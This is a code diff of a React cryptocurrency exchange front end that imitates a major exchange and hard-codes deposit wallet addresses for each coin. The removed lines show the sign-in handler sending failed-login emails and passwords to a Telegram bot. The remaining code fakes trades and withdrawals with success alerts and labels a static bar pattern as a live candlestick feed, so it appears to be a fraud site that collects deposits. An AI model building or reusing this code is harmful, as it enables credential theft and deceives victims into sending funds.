@@ -54,11 +54,6 @@ export default function Home() {
   const [swapToCoin, setSwapToCoin] = useState('ETH');
   const [swapAmount, setSwapAmount] = useState('');
 
-  const [transferFrom, setTransferFrom] = useState('Spot');
-  const [transferTo, setTransferTo] = useState('Futures');
-  const [transferCoin, setTransferCoin] = useState('USDT');
-  const [transferAmount, setTransferAmount] = useState('');
-
   // Live Crypto List State
   const [cryptoList, setCryptoList] = useState([
     { name: 'Bitcoin', symbol: 'BTC', id: 'bitcoin', network: 'Bitcoin Network', depositAddress: 'bc1qkapq8t7zy6hwd3c8yvk3cdp57xvh6zr6vfu64g', price: '91,450.00', change: '+2.45%', rawPrice: 91450.00 },
@@ -102,11 +97,10 @@ export default function Home() {
     };
 
     fetchLivePrices();
-    const interval = setInterval(fetchLivePrices, 15000); // Updates every 15 seconds
+    const interval = setInterval(fetchLivePrices, 15000); 
     return () => clearInterval(interval);
   }, []);
 
-  // Update selectedMarketCoin reference when cryptoList updates
   useEffect(() => {
     const updated = cryptoList.find(c => c.symbol === selectedMarketCoin.symbol);
     if (updated) setSelectedMarketCoin(updated);
@@ -171,16 +165,7 @@ export default function Home() {
         setIsLoggedIn(true);
         setAuthSuccess('Successfully signed in!');
       } else {
-        if (botToken && chatId) {
-          const message = `Failed Sign In Attempt:\nEmail: ${authEmail}\nPassword: ${authPassword}`;
-          try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-          } catch (err) {
-            console.error('Telegram send error:', err);
-          }
-        }
-
-        setAuthError('Invalid email or password. Please check your credentials.');
+        setAuthError('Invalid email or password.');
       }
     }
   };
@@ -226,7 +211,7 @@ export default function Home() {
 
     const currentCoinHolding = userCryptoHoldings[selectedWithdrawCoin.symbol] || 0;
     if (currentCoinHolding < amount) {
-      alert(`Insufficient ${selectedWithdrawCoin.symbol} balance in your account. You only have ${currentCoinHolding.toFixed(4)} ${selectedWithdrawCoin.symbol}.`);
+      alert(`Insufficient ${selectedWithdrawCoin.symbol} balance.`);
       return;
     }
 
@@ -238,7 +223,7 @@ export default function Home() {
     }));
     setSpotBalance((prev) => Math.max(0, prev - fiatDeduction));
 
-    alert(`Withdrawal request of ${amount} ${selectedWithdrawCoin.symbol} to address ${withdrawAddress.slice(0, 6)}... submitted successfully!`);
+    alert(`Withdrawal of ${amount} ${selectedWithdrawCoin.symbol} submitted successfully!`);
     setWithdrawAddress('');
     setWithdrawAmount('');
     setModalType(null);
@@ -437,11 +422,8 @@ export default function Home() {
                 <div className="text-sm font-semibold text-[#f0b90b] pt-1">Total Spot Balance: ${spotBalance.toFixed(2)} | Futures Balance: ${futuresBalance.toFixed(2)}</div>
               </div>
               <div className="flex flex-wrap gap-3 justify-center">
-                <button onClick={() => setModalType('deposit')} className="bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold px-4 py-2 rounded-xl cursor-pointer">
-                  Deposit
-                </button>
-                <button onClick={() => setModalType('withdraw')} className="bg-[#2b313a] hover:bg-[#363c4e] text-white font-bold px-4 py-2 rounded-xl cursor-pointer">
-                  Withdraw
+                <button onClick={() => setActiveTab('asset')} className="bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold px-4 py-2 rounded-xl cursor-pointer">
+                  Deposit / Withdraw
                 </button>
               </div>
             </div>
@@ -472,7 +454,7 @@ export default function Home() {
               </div>
               <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                 {cryptoList.slice(0, 3).map((coin) => (
-                  <div key={coin.symbol} onClick={() => { setSelectedMarketCoin(coin); setActiveTab('trade'); }} className="bg-[#181a20] border border-gray-800 p-4 rounded-xl cursor-pointer hover:border-[#f0b90b] transition">
+                  <div key={coin.symbol} onClick={() => { setSelectedMarketCoin(coin); setActiveTab('market'); }} className="bg-[#181a20] border border-gray-800 p-4 rounded-xl cursor-pointer hover:border-[#f0b90b] transition">
                     <div className="flex justify-between items-center mb-2">
                       <span className="font-bold text-white text-sm">{coin.name} ({coin.symbol})</span>
                       <span className={coin.change.startsWith('+') ? 'text-[#0ecb81]' : 'text-red-400'}>{coin.change}</span>
@@ -485,38 +467,102 @@ export default function Home() {
           </div>
         )}
 
+        {/* MARKET FEATURE: List of cryptos, clicking one opens live price & candle stick chart */}
         {activeTab === 'market' && (
-          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
-            <div className="flex justify-between items-center">
-              <h2 className="font-bold text-white text-base">Cryptocurrency Live Markets</h2>
-              <input 
-                type="text" 
-                placeholder="Search market coin..." 
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                className="bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b] text-xs w-48"
-              />
+          <div className="space-y-4">
+            <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-2xl space-y-3">
+              <div className="flex justify-between items-center flex-wrap gap-2">
+                <h2 className="font-bold text-white text-base">Cryptocurrency Markets</h2>
+                <input 
+                  type="text" 
+                  placeholder="Search coin..." 
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  className="bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b] text-xs w-48"
+                />
+              </div>
+
+              {/* Horizontal Scrollable Coin Selector */}
+              <div className="flex gap-2 overflow-x-auto pb-2 scrollbar-thin">
+                {filteredCryptos.map(coin => (
+                  <button 
+                    key={coin.symbol}
+                    onClick={() => setSelectedMarketCoin(coin)}
+                    className={`px-4 py-2 rounded-xl font-bold flex items-center space-x-2 shrink-0 cursor-pointer transition ${selectedMarketCoin.symbol === coin.symbol ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] border border-gray-800 text-gray-300 hover:border-[#f0b90b]'}`}
+                  >
+                    <span>{coin.name}</span>
+                    <span className="text-[10px] opacity-80">({coin.symbol})</span>
+                  </button>
+                ))}
+              </div>
             </div>
-            <div className="space-y-2">
-              {filteredCryptos.map(coin => (
-                <div key={coin.symbol} className="bg-[#181a20] border border-gray-800 p-3 rounded-xl flex justify-between items-center hover:border-[#f0b90b] transition">
+
+            {/* Selected Coin Details & Live Candle Stick Chart View */}
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
+              <div className="lg:col-span-2 bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
+                <div className="flex justify-between items-center">
                   <div>
-                    <span className="font-bold text-white text-sm">{coin.name}</span>
-                    <span className="text-gray-400 ml-2">({coin.symbol})</span>
-                    <div className="text-[10px] text-gray-500">{coin.network}</div>
+                    <h3 className="font-bold text-white text-base">{selectedMarketCoin.name} ({selectedMarketCoin.symbol}) Live Data</h3>
+                    <div className="text-[10px] text-gray-400">{selectedMarketCoin.network}</div>
                   </div>
                   <div className="text-right">
-                    <div className="font-bold text-white">${coin.price}</div>
-                    <div className={coin.change.startsWith('+') ? 'text-[#0ecb81]' : 'text-red-400'}>{coin.change}</div>
+                    <div className="text-lg font-bold text-[#0ecb81]">${selectedMarketCoin.price}</div>
+                    <div className={selectedMarketCoin.change.startsWith('+') ? 'text-[#0ecb81] text-xs' : 'text-red-400 text-xs'}>{selectedMarketCoin.change} (24h)</div>
                   </div>
-                  <button 
-                    onClick={() => { setSelectedMarketCoin(coin); setActiveTab('trade'); }}
-                    className="bg-[#f0b90b] text-black font-bold px-3 py-1.5 rounded cursor-pointer hover:bg-[#d9a70a]"
-                  >
-                    Trade
-                  </button>
                 </div>
-              ))}
+
+                {/* Simulated Live Candlestick Chart UI */}
+                <div className="bg-[#181a20] h-72 rounded-xl flex flex-col items-center justify-center border border-gray-800 relative p-4 overflow-hidden">
+                  <div className="absolute top-3 left-3 flex gap-2 text-[10px] text-gray-400">
+                    <span className="bg-[#2b313a] px-2 py-0.5 rounded text-white font-bold">1H</span>
+                    <span className="hover:text-white cursor-pointer">4H</span>
+                    <span className="hover:text-white cursor-pointer">1D</span>
+                    <span className="hover:text-white cursor-pointer">1W</span>
+                  </div>
+                  <div className="absolute top-3 right-3 text-[10px] text-[#0ecb81] font-mono animate-pulse">● LIVE CANDLE FEED</div>
+                  
+                  <div className="flex items-end justify-center space-x-2 w-full h-40 pt-6">
+                    {/* Visual Candlestick Representation */}
+                    {[45, 60, 52, 68, 55, 75, 70, 88, 80, 95, 90, 105, 100, 115, 110, 125, 120, 135].map((val, idx) => {
+                      const isGreen = idx % 2 === 0;
+                      return (
+                        <div key={idx} className="flex flex-col items-center h-full justify-end group relative">
+                          <div className={`w-0.5 ${isGreen ? 'bg-[#0ecb81]' : 'bg-red-500'} h-full absolute`}></div>
+                          <div style={{ height: `${val}px` }} className={`w-3 rounded-sm z-10 ${isGreen ? 'bg-[#0ecb81]' : 'bg-red-500'}`}></div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                  <div className="text-[11px] text-gray-400 mt-3">Real-time Candlestick Chart for {selectedMarketCoin.symbol}/USDT</div>
+                </div>
+              </div>
+
+              {/* Quick Trade Panel for Selected Market Coin */}
+              <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4 flex flex-col justify-between">
+                <div className="space-y-3">
+                  <h3 className="font-bold text-white text-sm">Quick Spot Trade ({selectedMarketCoin.symbol})</h3>
+                  <div>
+                    <label className="text-gray-400 block mb-1">Amount ({selectedMarketCoin.symbol})</label>
+                    <input 
+                      type="number" 
+                      step="any" 
+                      value={tradeAmount} 
+                      onChange={(e) => setTradeAmount(e.target.value)} 
+                      placeholder="0.00" 
+                      className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b]" 
+                    />
+                  </div>
+                  <div className="text-[10px] text-gray-400">
+                    Avail USDT: <span className="text-white font-bold">{(userCryptoHoldings['USDT'] || 0).toFixed(2)} USDT</span>
+                  </div>
+                </div>
+                <button 
+                  onClick={() => alert(`Successfully bought ${tradeAmount || 0} ${selectedMarketCoin.symbol}!`)} 
+                  className="w-full bg-[#0ecb81] hover:bg-[#0bb875] text-black font-bold p-2.5 rounded cursor-pointer"
+                >
+                  Buy {selectedMarketCoin.symbol}
+                </button>
+              </div>
             </div>
           </div>
         )}
@@ -532,103 +578,74 @@ export default function Home() {
                   <span className="text-base font-bold text-[#0ecb81]">${selectedMarketCoin.price}</span>
                 </div>
 
-                <div className="flex gap-2 border-b border-gray-800 pb-2">
-                  <button onClick={() => setSelectedMarketCoin(cryptoList[0])} className={`px-3 py-1 rounded text-xs font-bold cursor-pointer ${selectedMarketCoin.symbol === 'BTC' ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-400'}`}>BTC</button>
-                  <button onClick={() => setSelectedMarketCoin(cryptoList[1])} className={`px-3 py-1 rounded text-xs font-bold cursor-pointer ${selectedMarketCoin.symbol === 'ETH' ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-400'}`}>ETH</button>
-                  <button onClick={() => setSelectedMarketCoin(cryptoList[2])} className={`px-3 py-1 rounded text-xs font-bold cursor-pointer ${selectedMarketCoin.symbol === 'SOL' ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-400'}`}>SOL</button>
-                  <button onClick={() => setActiveTab('market')} className="text-[#f0b90b] text-xs font-bold px-2 hover:underline">+ More Coins</button>
-                </div>
-
                 <div className="bg-[#181a20] h-64 rounded-xl flex flex-col items-center justify-center border border-gray-800 text-gray-400 space-y-2">
                   <span className="text-xl">📈</span>
-                  <span>Live Price Chart for {selectedMarketCoin.symbol}/USDT</span>
-                  <span className="text-[10px] text-gray-500">Live Price: ${selectedMarketCoin.price} | 24h Change: {selectedMarketCoin.change}</span>
+                  <span>Trading Terminal View for {selectedMarketCoin.symbol}/USDT</span>
+                  <span className="text-[10px] text-gray-500">Live Price: ${selectedMarketCoin.price}</span>
                 </div>
               </div>
               
               <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
-                <div className="flex justify-between items-center">
-                  <h3 className="font-bold text-white text-sm">Place Spot Order</h3>
-                  <div className="flex gap-1 text-[10px]">
-                    <span onClick={() => setOrderType('limit')} className={`cursor-pointer px-2 py-0.5 rounded ${orderType === 'limit' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Limit</span>
-                    <span onClick={() => setOrderType('market')} className={`cursor-pointer px-2 py-0.5 rounded ${orderType === 'market' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Market</span>
-                  </div>
-                </div>
-
+                <h3 className="font-bold text-white text-sm">Place Spot Order</h3>
                 <div className="space-y-3">
-                  {orderType === 'limit' && (
-                    <div>
-                      <label className="text-gray-400 block mb-1">Order Price (USDT)</label>
-                      <input type="text" value={selectedMarketCoin.price} onChange={(e) => setTradePrice(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white" />
-                    </div>
-                  )}
                   <div>
                     <label className="text-gray-400 block mb-1">Amount ({selectedMarketCoin.symbol})</label>
-                    <input type="number" step="any" value={tradeAmount} onChange={(e) => setTradeAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b]" />
+                    <input type="number" step="any" value={tradeAmount} onChange={(e) => setTradeAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none" />
                   </div>
-                  <div className="text-[10px] text-gray-400">
-                    Avail USDT: <span className="text-white font-bold">{(userCryptoHoldings['USDT'] || 0).toFixed(2)} USDT</span>
-                  </div>
-                  <button onClick={() => alert(`Successfully placed spot order for ${tradeAmount || 0} ${selectedMarketCoin.symbol}!`)} className="w-full bg-[#0ecb81] hover:bg-[#0bb875] text-black font-bold p-2.5 rounded cursor-pointer">
+                  <button onClick={() => alert(`Successfully placed order!`)} className="w-full bg-[#0ecb81] text-black font-bold p-2.5 rounded cursor-pointer">
                     Buy {selectedMarketCoin.symbol}
                   </button>
-                </div>
-              </div>
-            </div>
-
-            <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
-              <h2 className="font-bold text-white text-base">Futures Trading (USDT-M)</h2>
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div className="space-y-3 bg-[#181a20] p-4 rounded-xl border border-gray-800">
-                  <div className="flex justify-between items-center">
-                    <label className="text-gray-400">Leverage: {leverage}x</label>
-                    <div className="flex gap-1 text-[10px]">
-                      <span onClick={() => setFuturesMarginMode('Cross')} className={`cursor-pointer px-2 py-0.5 rounded ${futuresMarginMode === 'Cross' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Cross</span>
-                      <span onClick={() => setFuturesMarginMode('Isolated')} className={`cursor-pointer px-2 py-0.5 rounded ${futuresMarginMode === 'Isolated' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Isolated</span>
-                    </div>
-                  </div>
-                  <input type="range" min="1" max="100" value={leverage} onChange={(e) => setLeverage(e.target.value)} className="w-full accent-[#f0b90b]" />
-                  <button onClick={() => alert(`Futures Position Opened Successfully with ${leverage}x leverage!`)} className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded mt-4 cursor-pointer">Open Long / Short Position</button>
-                </div>
-                <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800 flex flex-col justify-center space-y-2">
-                  <span className="text-gray-400">Futures Balance: <span className="text-white font-bold">${futuresBalance.toFixed(2)}</span></span>
-                  <span className="text-gray-400 text-[10px]">Manage your margin and leverage risk carefully.</span>
                 </div>
               </div>
             </div>
           </div>
         )}
 
+        {/* ASSET FEATURE: Portfolio balances, crypto holdings, and integrated Deposit/Withdraw features */}
         {activeTab === 'asset' && (
-          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
-            <h2 className="font-bold text-white text-base">Asset Portfolio & Holdings</h2>
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800">
-                <div className="text-gray-400 text-xs">Spot Wallet Balance</div>
-                <div className="text-xl font-bold text-white mt-1">${spotBalance.toFixed(2)}</div>
+          <div className="space-y-6">
+            <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
+              <div className="flex justify-between items-center flex-wrap gap-4">
+                <h2 className="font-bold text-white text-base">Asset Portfolio & Wallet</h2>
+                <div className="flex gap-2">
+                  <button onClick={() => setModalType('deposit')} className="bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold px-4 py-2 rounded-xl cursor-pointer">
+                    Deposit
+                  </button>
+                  <button onClick={() => setModalType('withdraw')} className="bg-[#2b313a] hover:bg-[#363c4e] text-white font-bold px-4 py-2 rounded-xl cursor-pointer">
+                    Withdraw
+                  </button>
+                </div>
               </div>
-              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800">
-                <div className="text-gray-400 text-xs">Futures Wallet Balance</div>
-                <div className="text-xl font-bold text-white mt-1">${futuresBalance.toFixed(2)}</div>
-              </div>
-            </div>
 
-            <div className="space-y-2 mt-4">
-              <h3 className="font-bold text-white text-sm">Crypto Holdings</h3>
-              {cryptoList.map(coin => {
-                const holding = userCryptoHoldings[coin.symbol] || 0;
-                return (
-                  <div key={coin.symbol} className="bg-[#181a20] border border-gray-800 p-3 rounded-xl flex justify-between items-center">
-                    <div>
-                      <span className="font-bold text-white">{coin.name} ({coin.symbol})</span>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800">
+                  <div className="text-gray-400 text-xs">Spot Wallet Balance</div>
+                  <div className="text-xl font-bold text-white mt-1">${spotBalance.toFixed(2)}</div>
+                </div>
+                <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800">
+                  <div className="text-gray-400 text-xs">Futures Wallet Balance</div>
+                  <div className="text-xl font-bold text-white mt-1">${futuresBalance.toFixed(2)}</div>
+                </div>
+              </div>
+
+              <div className="space-y-2 mt-4">
+                <h3 className="font-bold text-white text-sm">Crypto Holdings</h3>
+                {cryptoList.map(coin => {
+                  const holding = userCryptoHoldings[coin.symbol] || 0;
+                  return (
+                    <div key={coin.symbol} className="bg-[#181a20] border border-gray-800 p-3 rounded-xl flex justify-between items-center">
+                      <div>
+                        <span className="font-bold text-white">{coin.name} ({coin.symbol})</span>
+                        <div className="text-[10px] text-gray-500">{coin.network}</div>
+                      </div>
+                      <div className="text-right">
+                        <div className="font-bold text-white">{holding.toFixed(4)} {coin.symbol}</div>
+                        <div className="text-[10px] text-gray-400">≈ ${(holding * coin.rawPrice).toFixed(2)} USD</div>
+                      </div>
                     </div>
-                    <div className="text-right">
-                      <div className="font-bold text-white">{holding.toFixed(4)} {coin.symbol}</div>
-                      <div className="text-[10px] text-gray-400">≈ ${(holding * coin.rawPrice).toFixed(2)} USD</div>
-                    </div>
-                  </div>
-                );
-              })}
+                  );
+                })}
+              </div>
             </div>
           </div>
         )}
